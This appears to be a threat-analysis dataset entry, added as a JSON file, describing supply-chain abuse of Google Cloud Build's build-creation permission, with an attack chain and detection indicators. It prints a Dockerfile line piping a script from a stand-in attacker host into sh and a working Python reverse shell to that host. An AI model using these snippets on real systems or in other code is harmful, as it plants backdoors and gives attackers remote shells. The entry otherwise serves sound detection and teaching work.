@@ -1,0 +1,110 @@
+{
+  "package_info": {
+    "package_name": "Google Cloud Build (abused via cloudbuild.builds.create permission)",
+    "package_manager": "Google Cloud Platform (GCP)",
+    "package_versions": "All versions with misconfigured permissions",
+    "why_malicious": "The abuse of the cloudbuild.builds.create permission allows attackers to escalate privileges, inject malicious code into production container images, and poison the software supply chain, leading to backdoors, data theft, and denial-of-service attacks."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "CI/CD pipeline execution (build-time)",
+        "file_location": "Injected into container images via Google Cloud Build pipeline",
+        "required_permissions": [
+          "cloudbuild.builds.create",
+          "artifact registry access",
+          "GKE deployment",
+          "network",
+          "filesystem"
+        ]
+      },
+      "code_snippet": "// Example: Malicious shell command injected into Dockerfile or build script\nRUN curl -fsSL http://malicious.example.com/backdoor.sh | sh",
+      "code_language": "shell",
+      "code_behavior": "During build-time, the code downloads and executes a remote shell script from a malicious domain, which installs a backdoor into the container image, enabling remote access when the image is deployed.",
+      "malice_analysis": {
+        "why_suspicious": "The build process is used to inject code from an untrusted external source, which is not part of the legitimate application.",
+        "violated_expectations": "Normal builds should only include code from trusted repositories and not fetch or execute remote scripts from unknown domains.",
+        "similar_legitimate_use": "Fetching dependencies from official package repositories during build (e.g., apt-get, pip install) is legitimate, but fetching and executing arbitrary scripts is not.",
+        "key_indicators": [
+          "curl/wget to external domain in build scripts",
+          "piping remote script output directly to shell",
+          "modification of container images outside of source control"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "Runtime (when compromised image is launched in GKE)",
+        "file_location": "Entrypoint or startup script inside compromised container image",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "# Example: Python backdoor in entrypoint\nimport socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"malicious.example.com\",4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call([\"/bin/sh\",\"-i\"])",
+      "code_language": "python",
+      "code_behavior": "At runtime, the code opens a reverse shell connection to a remote attacker-controlled server, granting remote command execution inside the production environment.",
+      "malice_analysis": {
+        "why_suspicious": "The code establishes an outbound connection to an untrusted server and provides shell access, which is a classic backdoor technique.",
+        "violated_expectations": "Application containers should not initiate arbitrary outbound connections or provide shell access to external parties.",
+        "similar_legitimate_use": "Remote debugging tools may open connections, but only to trusted endpoints and with authentication.",
+        "key_indicators": [
+          "hardcoded external IP/domain",
+          "use of socket to connect to remote host",
+          "duplication of file descriptors for shell access"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker abuses cloudbuild.builds.create permission to initiate a new build as a privileged service account.",
+      "implemented_by": [],
+      "leads_to": "Ability to modify build artifacts and inject malicious code"
+    },
+    {
+      "step": 2,
+      "action": "Malicious code is injected into container images during the build process (e.g., via Dockerfile or build script).",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Compromised images are stored in Artifact Registry"
+    },
+    {
+      "step": 3,
+      "action": "Compromised images are deployed to Google Kubernetes Engine (GKE) or other production environments.",
+      "implemented_by": [],
+      "leads_to": "Malicious code is executed in production"
+    },
+    {
+      "step": 4,
+      "action": "Backdoor code executes at runtime, establishing a remote connection for attacker control.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Attacker gains persistent access, enabling data theft, DoS, or further lateral movement"
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Unexpected build jobs initiated by non-standard accounts",
+      "Build scripts downloading and executing remote code",
+      "Container images with outbound connections to untrusted domains",
+      "Reverse shell or backdoor patterns in entrypoint scripts"
+    ],
+    "file_indicators": [
+      "Dockerfile or build scripts containing curl/wget to external domains",
+      "Entrypoint scripts with socket or subprocess usage",
+      "Unusual modifications to images in Artifact Registry"
+    ],
+    "network_indicators": [
+      "Outbound connections from build or runtime environments to unknown IPs/domains",
+      "Connections to attacker-controlled C2 infrastructure (e.g., malicious.example.com:4444)"
+    ],
+    "how_to_detect": "Monitor Cloud Build logs for unexpected build initiations and privilege escalations. Scan build scripts and Dockerfiles for commands that fetch and execute remote code. Analyze container images for embedded backdoor code and monitor runtime network activity for suspicious outbound connections. Enforce least privilege on cloudbuild.builds.create and related permissions."
+  }
+}
